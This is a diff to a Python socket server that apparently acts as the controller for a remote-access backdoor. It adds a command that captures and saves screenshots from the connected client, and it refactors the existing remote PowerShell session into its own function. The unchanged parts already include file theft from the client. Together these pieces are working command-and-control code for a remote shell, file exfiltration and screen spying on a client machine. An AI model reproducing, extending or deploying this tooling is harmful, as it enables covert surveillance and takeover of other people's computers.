@@ -8,8 +8,8 @@ import datetime
 #socket.recv(): if there is no byte sent to the server --> wait until it can read at least 1 byte
 #if there are some bytes sent, read them and return immediately, regardless of the parameter passed to the function
 
-
-acceptedCMD = {"close": 1, "powershell": 2, "get": 3}
+#additional command: exit ---> turn off server
+acceptedCMD = {"close": 1, "powershell": 2, "get": 3, "screen": 4}
 
 def performHandshake(c):
     handshake = c.recv(10)
@@ -61,6 +61,21 @@ def communicatePowershell(c):
         if (command == "exit\n"):
             break
         
+def openPowershell(c):
+    print("Open Powershell")
+    c.send(struct.pack("<i", acceptedCMD["powershell"])) #send command code to the client
+    status = recvCommandStatus(c)
+    if (status == 0):   
+        output = receiveData(c, 5)
+        if (output):
+            sys.stdout.write(output)
+        else:
+            print("Client error")
+            return
+        communicatePowershell(c)
+    else:
+                print("Can't spawn powershell. Error: " + str(status))
+
 #can only get 1 file at a time for now
 def getFileFromClient(c, command):
     #check command syntax
@@ -77,6 +92,26 @@ def getFileFromClient(c, command):
         return
     
     c.setblocking(False)
+    with open(filename, "wb+") as f:
+        while True:
+            ready = select.select([c], [], [], 60)
+            if (ready[0]):
+                data = c.recv(1024)
+                f.write(data)
+            else:
+                break
+    c.setblocking(True)
+    return
+
+#receive the screenshot and save it
+def recvScreen(c):
+    c.send(struct.pack("<i", acceptedCMD["screen"]))
+    clientStatus = recvCommandStatus(c)
+    if (clientStatus != 0):
+        print("Failed to get screenshot")
+        return
+    c.setblocking(False)
+    filename = datetime.datetime.now().strftime("%H-%M-%d-%m-%Y") + "-screen.jpeg"
     with open(filename, "wb+") as f:
         while True:
             ready = select.select([c], [], [], 60)
@@ -123,22 +158,13 @@ while True:
                     break
                 
                 elif (command[0] == "powershell"):
-                    print("Open Powershell")
-                    connection.send(struct.pack("<i", acceptedCMD[command[0]])) #send command code to the client
-                    status = recvCommandStatus(connection)
-                    if (status == 0):   
-                        output = receiveData(connection, 5)
-                        if (output):
-                            sys.stdout.write(output)
-                        else:
-                            print("Client error")
-                            break
-                        communicatePowershell(connection)
-                    else:
-                        print("Can't spawn powershell. Error: " + str(status))
+                    openPowershell(connection)
                     
                 elif (command[0] == "get"):
                     getFileFromClient(connection, command)
+                    
+                elif (command[0] == "screen"):
+                    recvScreen(connection)
               
                                
         
